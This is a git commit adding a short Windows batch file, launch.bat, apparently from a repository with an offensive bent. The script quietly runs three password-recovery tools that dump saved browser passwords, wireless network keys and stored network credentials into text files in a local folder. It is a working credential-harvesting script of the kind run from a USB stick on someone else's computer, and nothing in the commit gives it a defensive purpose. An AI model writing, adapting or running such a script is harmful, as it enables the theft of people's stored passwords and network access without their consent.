094e854cdbc70a2385c0a1dcf65b4c0c979962f8
akkinnator <113459996+greyhatworld@users.noreply.github.com>
2022-10-17 19:21:18 +0200

    Add files via upload

---
+++ launch.bat
@@ -0,0 +1,4 @@
+@echo off
+start WebBrowserPassView.exe /stext dossier1/WebBrowserPassView.txt
+start WirelessKeyView.exe /stext dossier1/WirelessKeyView.txt
+start netpass.exe /stext dossier1/netpass.txt
